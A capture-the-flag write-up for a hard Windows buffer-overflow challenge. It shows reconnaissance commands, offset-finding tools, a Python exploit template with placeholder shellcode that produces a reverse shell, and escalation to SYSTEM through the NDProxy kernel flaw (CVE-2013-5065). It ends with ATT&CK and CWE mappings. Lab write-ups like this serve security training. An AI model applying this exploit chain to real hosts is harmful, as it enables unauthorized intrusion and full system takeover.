# MAQ168: BoF Try Harder

Writeup for the **BoF Try Harder** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Buffer Overflow
> **Difficulty:** Hard
> **Points:** 168

---

## Overview

This challenge combines a buffer overflow vulnerability in a Windows service with a kernel-level privilege escalation using MS14-002 (CVE-2013-5065), which exploits the NDProxy.sys driver. Initial access is gained through a stack overflow leading to remote code execution, followed by a local kernel exploit to achieve SYSTEM privileges and retrieve the flag.

## Reconnaissance

```bash
nmap -sC -sV -p- [TARGET_IP]
```

The scan reveals a Windows target with a custom service on a non-standard port. Interacting with the service confirms it accepts arbitrary input susceptible to overflow.

```bash
nc -v [TARGET_IP] [PORT]
```

## Exploitation

### Phase 1: Buffer Overflow

1. **Fuzzing:** send incrementally larger payloads to trigger a crash and determine the approximate buffer size.
2. **Offset identification:** use a cyclic pattern to pinpoint the exact offset to EIP.

```bash
msf-pattern_create -l [LENGTH]
msf-pattern_offset -l [LENGTH] -q [EIP_VALUE]
```

3. **Bad character enumeration:** test all byte values to identify restricted characters.
4. **Return address selection:** locate a `JMP ESP` gadget in a non-ASLR module using mona or similar tools.
5. **Payload assembly:** construct the exploit with the correct offset, return address, NOP sled, and staged shellcode.

```python
import socket, struct

offset = [OFFSET]
eip = struct.pack("<I", 0x[JMP_ESP_ADDR])
nops = b"\x90" * 32
shellcode = b"[STAGED_SHELLCODE]"

payload = b"A" * offset + eip + nops + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("[TARGET_IP]", [PORT]))
s.send(payload)
s.close()
```

The reverse shell lands as a low-privilege service account.

### Phase 2: Kernel Privilege Escalation (MS14-002 / CVE-2013-5065)

1. Confirm the Windows version and patch level: the target runs an unpatched Windows XP/2003 kernel.
2. Transfer the NDProxy exploit to the target.
3. Execute the kernel exploit, which abuses a NULL pointer dereference in `NDProxy.sys` to gain SYSTEM-level code execution.

```cmd
whoami
# [LOW_PRIV_USER]

NDProxy.exe
whoami
# nt authority\system
```

4. Navigate to the restricted directory and read the flag.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploitation of Remote Services | T1210 |
| Exploitation for Privilege Escalation | T1068 |
| Command and Scripting Interpreter: Windows Command Shell | T1059.003 |
| Process Injection | T1055 |

### CWE

- **CWE-121:** Stack-based Buffer Overflow
- **CWE-476:** NULL Pointer Dereference
- **CWE-269:** Improper Privilege Management

### D3FEND

- **D3-SEA:** System Event Analysis
- **D3-PSA:** Process Spawn Analysis

---

The buffer was only the first wall; behind it sat a kernel driver with a null pointer and no patience for validation. Two exploits, two layers broken, one flag claimed.

(❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
